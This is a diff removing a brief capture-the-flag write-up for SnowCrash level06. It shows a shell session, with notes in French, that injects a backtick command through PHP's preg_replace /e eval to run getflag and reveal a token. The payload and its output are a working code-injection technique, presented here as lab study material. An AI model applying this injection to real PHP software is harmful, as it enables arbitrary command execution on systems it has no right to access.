@@ -1,9 +1,0 @@
-level06@SnowCrash:~$ echo '[x ${`getflag`}]' > /tmp/tst
-
-level06@SnowCrash:~$ ./level06 /tmp/tst foo
-PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
- in /home/user/level06/level06.php(4) : regexp code on line 1
-
-[x ${`getflag`}] le regex le transforme en eval(y({`getflag`})) 
-le eval /e execute le contenue dans la construction et les backticks le rende executable 
-le contenue est remplacer par le resultat
